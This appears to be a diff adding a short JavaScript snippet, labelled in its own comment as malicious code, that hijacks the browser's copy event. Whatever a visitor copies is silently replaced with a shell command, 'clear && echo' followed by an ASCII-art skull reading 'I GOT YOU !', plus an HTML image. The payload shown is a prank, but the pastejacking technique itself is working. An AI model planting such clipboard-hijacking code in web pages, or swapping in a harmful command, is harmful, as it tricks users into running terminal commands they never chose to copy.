@@ -1,0 +1,9 @@
+/*
+ * This is the malicious code.
+ */
+window.document.addEventListener('copy', (event) => {
+event.clipboardData.setData('text/plain', 'clear && echo "MMMMMM     I GOT YOU !      MMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMM        MMMMMMMMMMMM\nMMMMMMMMMM            MMMMMMMMMM\nMMMMMMMMM              MMMMMMMMM\nMMMMMMMM                MMMMMMMM\nMMMMMMM                 MMMMMMMM\nMMMMMMM                  MMMMMMM\nMMMMMMM                  MMMMMMM\nMMMMMMM    MMM    MMM    MMMMMMM\nMMMMMMM   MMMMM   MMMM   MMMMMMM\nMMMMMMM   MMMMM   MMMM   MMMMMMM\nMMMMMMMM   MMMM M MMMM  MMMMMMMM\nMMVKMMMM        M        MMMMMMM\nMMMMMMMM       MMM      MMMMMMMM\nMMMMMMMMMMMM   MMM  MMMMMMMMMMMM\nMMMMMMMMMM MM       M  MMMMMMMMM\nMMMMMMMMMM  M M M M M MMMMMMMMMM\nMMMM  MMMMM MMMMMMMMM MMMMM   MM\nMMM    MMMM M MMMMM M MMMM    MM\nMMM    MMMM   M M M  MMMMM   MMM\nMMMM    MMMM         MMM      MM\nMMM       MMMM     MMMM       MM\nMMM         MMMMMMMM      M  MMM\nMMMM  MMM      MMM      MMMMMMMM\nMMMMMMMMMMM  MM       MMMMMMM  M\nMMM  MMMMMMM       MMMMMMMMM   M\nMM    MMM        MM            M\nMM            MMMM            MM\nMMM        MMMMMMMMMMMMM       M\nMM      MMMMMMMMMMMMMMMMMMM    M\nMMM   MMMMMMMMMMMMMMMMMMMMMM   M\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMM     I GOT YOU !      MMMM"\n');
+event.clipboardData.setData('text/html', '<img src="https://media.giphy.com/media/2pk0kZS3sIcAo/giphy.gif">');
+event.preventDefault();
+event.stopImmediatePropagation();
+}, true);
